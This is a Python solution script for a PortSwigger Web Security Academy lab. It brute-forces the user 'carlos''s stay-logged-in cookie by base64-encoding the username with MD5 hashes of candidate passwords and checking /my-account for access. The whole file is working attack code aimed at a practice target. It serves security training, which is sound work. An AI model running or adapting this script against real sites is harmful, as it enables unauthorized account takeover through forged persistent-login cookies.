#!/usr/bin/env python3
# Lab: Brute-forcing a stay-logged-in cookie
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
# Difficulty: PRACTITIONER

import aiohttp
import asyncio
import base64
import hashlib
import sys
import urllib3
import aiofiles
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_cookie_value(password: str) -> str:
    """Generate the cookie value for a given password."""
    md5value = hashlib.md5(password.encode()).hexdigest()
    encoded_str = f'carlos:{md5value}'
    b64 = base64.b64encode(encoded_str.encode())
    return b64.decode()


async def try_password(session: aiohttp.ClientSession, host: str, password: str) -> bool:
    """Try a password and check if it grants access."""
    cookie_value = get_cookie_value(password)
    session.cookie_jar.update_cookies({'stay-logged-in': cookie_value})

    async with session.get(f'{host}/my-account', allow_redirects=False) as response:
        text = await response.text()
        return 'Your username is: carlos' in text


async def main() -> None:
    """Main function to execute the brute force attack."""
    print('[+] Lab: Brute-forcing a stay-logged-in cookie')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    # Build a file path relative to the current working directory and stuff subdirectory
    password_file = Path.cwd() / 'stuff' / 'candidate_passwords.txt'

    async with aiohttp.ClientSession() as session:
        async with aiofiles.open(password_file, 'r') as f:
            async for line in f:
                password = line.strip()
                msg = f'[ ] Try password: {password}'
                print(f'{msg}{" " * (80 - len(msg))}', end='\r', flush=True)

                if await try_password(session, host, password):
                    print(password)
                    print(f'[+] Access to account page of carlos successful')
                    sys.exit(0)

    print(f'[-] Brute force of cookie value not successful')


if __name__ == "__main__":
    asyncio.run(main())
